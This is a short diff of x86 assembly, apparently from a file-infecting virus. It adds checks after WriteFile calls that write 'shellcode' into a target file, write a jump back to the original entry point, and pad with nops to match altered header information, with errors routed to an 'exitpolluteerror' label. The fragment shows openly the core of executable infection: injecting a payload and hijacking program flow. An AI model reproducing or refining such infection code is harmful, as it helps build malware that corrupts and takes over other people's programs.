@@ -486,7 +486,9 @@ push 	eax
 push	offset shellcode
 push	filePointer
 call		WriteFile
+
 cmp	eax, 0
+je		exitpolluteerror
 
 ;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
 push	0
@@ -496,6 +498,8 @@ push	offset decalage
 push	filePointer
 call		WriteFile
 
+cmp	eax, 0
+je		exitpolluteerror
 
 ;fill the rest with nop in order to have the same size as we put in the header info
 push	ecx
